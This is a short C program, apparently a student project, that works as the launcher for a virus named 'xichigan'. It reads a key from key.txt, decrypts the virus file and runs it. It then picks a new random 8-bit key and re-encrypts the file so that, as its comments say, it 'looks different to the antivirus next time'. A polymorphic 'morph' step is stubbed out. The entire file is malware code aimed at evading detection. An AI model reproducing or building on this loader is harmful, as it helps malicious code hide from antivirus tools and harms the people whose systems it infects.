#include "start.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: start                    									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	FILE *keyFp;
	char ch;
	int key;
	int status;
 	
	/* 
		Decrypt the file Xichigan using the key in key.txt
	*/
	// Get the key from key.txt
	keyFp = fopen("key.txt","r");
	fscanf (keyFp, "%d", &key); 
	fclose(keyFp);

	// Decrypt the file needed to run the virus
	decryptFile(key);

	/* 
		Once the file is decrypted, start xichigan running
	*/
	system ("xichigan");

	// Wait for xichigan to finish
	wait(&status);

	/* 
		Get a key to encrypt the file with (8 bit key) = 1-255 DEC 
		and write it to key.txt to use when decrypting next time
	*/
	srand(time(NULL));
	key = rand() % 255 + 1; 

	keyFp = fopen("key.txt","w");
	fprintf (keyFp, "%d", key); 
	fclose(keyFp);

	/*
		Encrypt/Morph the file xichigan using the key so it looks different to the antivirus next time
	*/

	// Morph the file xichigan
	//morphFile();

	// Encrypt the file xichigan
	decryptFile(key); // Symmetric key; so 'decrypt' is encrypt as well

	return 0;
}


